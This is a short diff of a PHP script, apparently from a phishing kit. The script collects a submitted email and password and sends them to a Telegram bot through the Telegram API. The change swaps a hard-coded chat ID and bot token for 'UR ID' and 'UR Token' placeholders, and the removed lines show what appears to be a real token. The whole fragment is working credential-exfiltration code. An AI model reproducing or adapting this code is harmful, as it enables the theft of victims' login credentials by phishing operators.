@@ -39,7 +39,7 @@ Email: '.$email.'
 Password: '.$password.'
 ';
 $message = urlencode($message);
-$chat_id = "774626437";
-$API_TOKEN = "1050544423:AAFVm7IEgYp2-2ZZsWjfKiNEwSsxHoX1Urg";
+$chat_id = "UR ID";
+$API_TOKEN = "UR Token";
 file_get_contents("https://api.telegram.org/bot{$API_TOKEN}/sendMessage?text={$message}&chat_id={$chat_id}");
 
